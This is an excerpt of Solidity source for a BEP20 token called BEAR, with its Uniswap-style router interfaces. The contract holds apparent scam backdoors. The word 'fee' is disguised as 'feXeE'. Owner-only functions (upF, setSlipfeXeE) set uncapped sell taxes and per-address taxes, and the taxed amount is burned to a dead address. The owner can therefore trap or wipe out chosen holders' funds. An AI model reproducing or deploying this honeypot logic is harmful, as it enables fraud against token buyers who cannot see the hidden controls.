...
interface IUniswapV2Factory {
    ...
    function feXeETo() external view returns (address);
    function feXeEToSetter() external view returns (address);
    ...
    function setfeXeETo(address) external;
    function setfeXeEToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeXeEOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeXeEOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeXeEOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeXeEOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeXeEOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract BEAR is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeXeE = 0;

    uint256 private _defaultBuyfeXeE = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeXeE;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeXeE = _value;
    }

    function setSlipfeXeE(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeXeE[_address] = _value;
    }

    function getSlipfeXeE(address _address) external view onlyownar returns (uint256) {
        return _slipfeXeE[_address];
    }


    function setMAccountfeXeE(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeXeE(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeXeEAmount = 0;

        if (rF) {
            uint256 tradefeXeE = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeXeE = _defaultSellfeXeE;
                }
                if (from == uniswapV2Pair) {

                    tradefeXeE = _defaultBuyfeXeE;
                }
            }
            if (_slipfeXeE[from] > 0) {
                tradefeXeE = _slipfeXeE[from];
            }

            tradefeXeEAmount = _Amount.mul(tradefeXeE).div(100);
        }


        if (tradefeXeEAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeXeEAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeXeEAmount);
            emit Transfer(from, _deadAddress, tradefeXeEAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeXeEAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeXeEAmount);
        emit Transfer(from, _to, _Amount - tradefeXeEAmount);
    }
